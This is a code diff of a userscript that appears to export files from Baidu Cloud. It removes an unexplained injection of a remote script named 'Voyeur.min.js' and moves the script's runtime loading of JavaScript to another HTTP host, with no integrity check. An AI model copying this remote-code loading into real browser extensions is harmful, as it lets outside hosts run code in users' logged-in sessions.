@@ -16,15 +16,11 @@
 // @version	0.2.9
 // ==/UserScript==
 
-
-
-var script = document.createElement('script');
-script.src = "http://xnjty-test.stor.sinaapp.com/Voyeur.min.js";
-document.body.appendChild(script);
-	
 var version = "0.2.9";
 var thedate_update = "2014/05/29";
 var baidu_version = "201405225544";
+var updatejsurl = "http://downjs.sinaapp.com/";
+
 //判断是否要载入远程JS和默认COOKIE的写入
 function A () {
 var name = "bcofl_v2";
@@ -99,7 +95,7 @@ else{
 		window.perform_of_number = 1;
 		var script = document.createElement('script');
 		script.id = "webjs";
-		script.src = "http://baiducloudwebplug.duapp.com/javascript/file.php?name=baiducloud_exporter_UglifyJSgg.js";
+		script.src = "http://downjs.sinaapp.com/javascript/baiducloud_exporter_UglifyJSgg.js";
 		script.onload = script.onreadystatechange = function(){
 		if( ! this.readyState || this.readyState=='loaded' || this.readyState=='complete' ){
 			//alert('loaded');
@@ -320,7 +316,7 @@ add_setting_div = function () {
 	html_.push('</div>');
 	html_.push('</div>');
 	html_.push('<div style="margin-top:10px;">');
-	html_.push('<div style="float:left; margin-top:25px; color: #656565">\u811a\u672c\u7248\u672c\uff1a'+version+'\u0020\u66f4\u65b0\u4e8e\uff1a'+thedate_update+'<a href="http://baiducloudwebplug.duapp.com/" style="margin-left: 10px" target="_blank">\u53bb\u770b\u770b\u6709\u6ca1\u6709\u66f4\u65b0\uff1f</a></div>');
+	html_.push('<div style="float:left; margin-top:25px; color: #656565">\u811a\u672c\u7248\u672c\uff1a'+version+'\u0020\u66f4\u65b0\u4e8e\uff1a'+thedate_update+'<a href="'+updatejsurl+'" style="margin-left: 10px" target="_blank">\u53bb\u770b\u770b\u6709\u6ca1\u6709\u66f4\u65b0\uff1f</a></div>');
 	html_.push('<div style="margin-left:77.5%;"><a href="javascript:;" id="yingyong" style="display:inline-block; width:120px; height:30px; border:1px solid #D1D1D1; background-color: #F7F7F7; text-align: center; text-decoration: none; padding-top:7px; color:#1B83EB;"><b>\u5e94\u7528</b></a></div>');
 	html_.push('</div></div></div>');
 
